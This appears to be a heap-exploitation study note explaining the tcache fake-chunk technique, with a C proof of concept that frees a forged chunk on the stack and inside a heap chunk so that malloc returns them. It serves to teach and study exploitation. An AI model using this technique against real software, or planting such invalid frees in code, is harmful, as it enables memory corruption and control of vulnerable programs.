<details>
<summary><strong>Description</strong></summary>
<p>

we will effectively write some data somewhere in memory we know, to make it look like a heap chunk. We will then pass a ptr to that chunk, to a free call to free it. Then depending on the status of the heap and our chunk, it will likely be inserted into a heap bin...

since the tcache doesnt have many mitigations, aiming for the tcache very effective...

</p>
</details>

<details>
<summary><strong>POC</strong></summary>
<p>

> compiled with glibc `2.31`, `2.35`, `2.38` and `2.39`

```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    setbuf(stdin, NULL); // disable buffering so _IO_FILE does not interfere with our heap
    setbuf(stdout, NULL);

    long p1[10], *p2, *chunk0, *chunk1;
    malloc(1); // init heap

    // create fake chunk on stack
    // p1[0] = 0;       // prev_size (we usually dont need to care about this)
    p1[1] = 0x21;    // size (must be in tcache range)
    // p1[2] = 0;       // fd pointer (we usually dont need to care about this)
    // p1[3] = 0;       // bk pointer (we usually dont need to care about this)
    // VULNERABILITY
    free(&p1[2]);
    // VULNERABILITY

    // create fake chunk inside a large chunk
    p2 = malloc(0x50);
    // p2[0] = 0;       // prev_size (we usually dont need to care about this)
    p2[1] = 0x21;    // size (must be in tcache range)
    // p2[2] = 0;       // fd pointer (we usually dont need to care about this)
    // p2[3] = 0;       // bk pointer (we usually dont need to care about this)
    // VULNERABILITY
    free(&p2[2]);
    // VULNERABILITY

    printf("[tcache 0x20] now has 2 fake chunk, we'll allocate them\n");
    chunk0 = malloc(0x18);
    chunk1 = malloc(0x18);

    printf("chunk0: %p\n", chunk0);
    printf("chunk1: %p\n", chunk1);
}
```

</p>
</details>

<details>
<summary><strong>Ref</strong></summary>
<p>

- https://github.com/guyinatuxedo/Shogun/blob/main/pwn_demos/tcache/tcache_fake_chunk/readme.md
- https://github.com/johnathanhuutri/CTFNote/tree/master/Heap-Exploitation#free-custom-chunk-table-of-content

</p>
</details>